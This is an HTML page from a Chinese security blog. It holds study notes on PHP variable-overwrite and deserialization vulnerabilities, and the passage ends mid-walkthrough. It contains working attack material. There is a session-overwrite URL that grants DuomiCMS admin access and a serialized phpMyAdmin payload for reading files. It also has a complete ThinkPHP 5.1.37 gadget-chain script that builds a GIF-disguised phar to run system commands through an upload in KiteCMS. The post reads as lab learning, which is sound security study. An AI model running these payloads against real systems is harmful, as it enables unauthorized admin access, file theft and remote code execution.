@@ -1,0 +1,866 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ADD8E6">
+  <meta name="author" content="bxhhf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="变量覆盖&amp;&amp;反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php变量覆盖&amp;&amp;反序列化">
+<meta property="og:url" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="bxhhf">
+<meta property="og:description" content="变量覆盖&amp;&amp;反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612165407968-17497184503321.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612195122319-17497292036382.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612195449608.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612195730224-17497294530563.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612200040294-17497296431514.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613131816631-17497919082841.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613132718575-17497924404893.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613132756409-17497924774404.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613132903387.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613134833615-17497937145005.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613135647233-17497942082036.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250615160238467.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250615145032413-17499702342031.png">
+<meta property="og:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250615211224682-17499931470401.png">
+<meta property="article:published_time" content="2025-06-12T10:23:24.000Z">
+<meta property="article:modified_time" content="2025-07-13T07:52:55.933Z">
+<meta property="article:author" content="bxhhf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bxhhf.github.io/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612165407968-17497184503321.png">
+  
+  
+  
+  <title>php变量覆盖&amp;&amp;反序列化 - bxhhf</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_3846514_kabxni94auf.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"bxhhf.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"enable":true,"app_id":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","app_key":"gbgqDB024hr2I7jmwbO6Mz2a","server_url":"https://an6azuya.lc-cn-n1-shared.com","enable_sync":false,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://registry.npmmirror.com/lxgw-wenkai-screen-web/latest/files/style.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">bxhhf</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/8.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.1)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php变量覆盖&amp;&amp;反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-12 18:23" pubdate>
+          2025年6月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php变量覆盖&amp;&amp;反序列化</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年7月13日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>变量覆盖&amp;&amp;反序列化</p>
+<span id="more"></span>
+
+
+
+<h1 id="一-变量覆盖"><a href="#一-变量覆盖" class="headerlink" title="一.变量覆盖"></a>一.变量覆盖</h1><p>常用的函数：</p>
+<ul>
+<li>extract()</li>
+</ul>
+<p>  parse_str()</p>
+<p>  importrequestvariables() </p>
+<ul>
+<li>$$</li>
+</ul>
+<h4 id="duomi分析"><a href="#duomi分析" class="headerlink" title="duomi分析"></a>duomi分析</h4><p>搜索$$,非后台文件先看主要看配置型文件</p>
+<p>将全局变量接受的键值对中值覆盖与键同名的变量</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?n</span>ame=xiaodi    -----&gt;    <span class="hljs-variable">$_k</span>=name    <span class="hljs-variable">$_v</span>=xiaodi<br><span class="hljs-variable">$&#123;</span><span class="hljs-variable">$_k</span>&#125;=<span class="hljs-variable">$name</span>    -----&gt;    <span class="hljs-variable">$name</span>=_RunMagicQuotes(xiaodi)<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612165407968-17497184503321.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>正常逻辑：</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612195122319-17497292036382.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612195449608.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>漏洞利用：</strong></p>
+<p>1.找包含变量覆盖所在的common.php文件，后台登陆（session覆盖）</p>
+<p>2.要找到<strong>有session_start()的文件才能覆盖session</strong></p>
+<p>exchange.php可以去完成全局变量session覆盖</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612195730224-17497294530563.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><code>session_start()</code>是PHP中的一个函数，用于启动一个会话。当一个用户访问网站时，会话（Session）是用来存储用户特定数据的一种机制，这些数据可以被多个页面共享。通过启动会话，PHP能够识别用户，并在用户的多次请求之间保存数据。</li>
+</ul>
+<p>3.动态调试或者直接看数据库获取保持当前登录的session值</p>
+<p>_SESSION[duomi_admin_id]&#x3D;1&amp;_SESSION[duomi_group_id]&#x3D;1&amp;_SESSION[duomi_admin_name]&#x3D;admin</p>
+<p>访问这个页面覆盖session值</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://duomicms:8234/upload/member/exchange.php?_SESSION</span>[<span class="hljs-string">duomi_admin_id</span>]=1&amp;_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_name]=admin<br></code></pre></td></tr></table></figure>
+
+
+
+<p>然后就可以直接进后台了</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250612200040294-17497296431514.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="二-反序列化"><a href="#二-反序列化" class="headerlink" title="二.反序列化"></a>二.反序列化</h1><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__wakeup</span>() <span class="hljs-comment">//使用unserialize时触发</span><br><br><span class="hljs-built_in">__sleep</span>() <span class="hljs-comment">//使用serialize时触发</span><br><br><span class="hljs-built_in">__destruct</span>() <span class="hljs-comment">//对象被销毁时触发</span><br><br><span class="hljs-built_in">__call</span>() <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span><br><br><span class="hljs-built_in">__callStatic</span>() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><br><br><span class="hljs-built_in">__get</span>() <span class="hljs-comment">//用于从不可访问的属性读取数据</span><br><br><span class="hljs-built_in">__set</span>() <span class="hljs-comment">//用于将数据写入不可访问的属性</span><br><br><span class="hljs-built_in">__isset</span>() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span><br><br><span class="hljs-built_in">__unset</span>() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><br><br><span class="hljs-built_in">__toString</span>() <span class="hljs-comment">//把类当作字符串使用时触发</span><br><br><span class="hljs-built_in">__invoke</span>() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="2-1原生反序列化"><a href="#2-1原生反序列化" class="headerlink" title="2.1原生反序列化"></a>2.1原生反序列化</h3><h4 id="phpmyadmin分析"><a href="#phpmyadmin分析" class="headerlink" title="phpmyadmin分析"></a>phpmyadmin分析</h4><p>搜索unserialize()</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613131816631-17497919082841.png" srcset="/img/loading.gif" lazyload></p>
+<p>找代码中的__wakeup,看看有没有可利用的漏洞</p>
+<img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613132718575-17497924404893.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+
+
+
+
+<p>调用的load方法里面，有读取文件的代码</p>
+<img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613132756409-17497924774404.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<p>参数source可控，source是个属性</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613132903387.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>准备漏洞利用，序列化PMA_Config类的对象，<strong>该对象的属性source已经被赋为要读取的文件路径</strong></p>
+<p>O:10:”PMA_Config”:1:{s:6:”source”;s:10:”d:&#x2F;aaa.txt”;}</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613134833615-17497937145005.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来把这个要被反序列化的传进去</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250613135647233-17497942082036.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://phpmyadmin2:<span class="hljs-number">8745</span>/scripts/setup.php<br><span class="hljs-attribute">post</span>提交：configuration=O:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;PMA_Config&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;d:/aaa.txt&quot;</span>;&#125;&amp;action=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>序列化之后的结果，找到利用点传进去</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;PMA_Config&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;d:/aaa.txt&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="2-2框架反序列化"><a href="#2-2框架反序列化" class="headerlink" title="2.2框架反序列化"></a>2.2框架反序列化</h3><h4 id="phar触发反序列化"><a href="#phar触发反序列化" class="headerlink" title="phar触发反序列化"></a>phar触发反序列化</h4><p>Phar之所以能触发反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,文件系统函数在通过phar伪协议解析phar文件时会调用<code>php_var_unserialize</code>反序列化meta-data储存的信息。</p>
+<p>并且：PHP在识别Phar文件时，是通过其标识<code>__HALT_COMPILER();?&gt;</code>，并且对标识前面的内容或后缀名没有严格要求的。<br>因此可以通过添加任意的文件头并修改Phar文件后缀名的方式，将Phar文件伪装成其他格式的文件，从而绕过上传点限制。</p>
+<p>php一大部分的<strong>文件系统函数</strong>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250615160238467.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="kitecms分析"><a href="#kitecms分析" class="headerlink" title="kitecms分析"></a>kitecms分析</h4><p>采用的thinkphp5.1.37框架</p>
+<p>使用phpggc生成反序列化链</p>
+<p><img src="/2025/06/12/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250615145032413-17499702342031.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>注入点</strong>：</p>
+<p>（上面学的是unserialize反序列化接收的参数）</p>
+<p>这里需要用到phar的反序列化</p>
+<p>思路是：先输出thinkPHP利用链的Phar文件，在源码中找到特殊文件操作函数，触发该函数</p>
+<p>1.生成ThinkPHP链的phar文件，配置文件中修改：phar.readonly &#x3D; Off</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Windows</span><br>    &#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">files</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$files</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$files</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">concern</span> &#123;<br>    <span class="hljs-title class_">trait</span> <span class="hljs-title class_">Conversion</span><br>    &#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">append</span> = <span class="hljs-title class_">array</span>(&quot;<span class="hljs-title class_">smi1e</span>&quot; =&gt; &quot;1&quot;);<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;smi1e&quot;</span> =&gt; <span class="hljs-string">&quot;system&quot;</span>);<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;smi1e&quot;</span> =&gt; <span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span> &#123;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span><br>    &#123;<br>        <span class="hljs-title class_">use</span> <span class="hljs-title class_">model</span>\<span class="hljs-title class_">concern</span>\<span class="hljs-title class_">Attribute</span>;<br>        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title class_">conver</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>();<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-variable">$conver</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;kitecms.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>2 .以png的形式成功上传上面phar文件</p>
+<p>3 .is_dir函数在方法scanFilesForTree中</p>
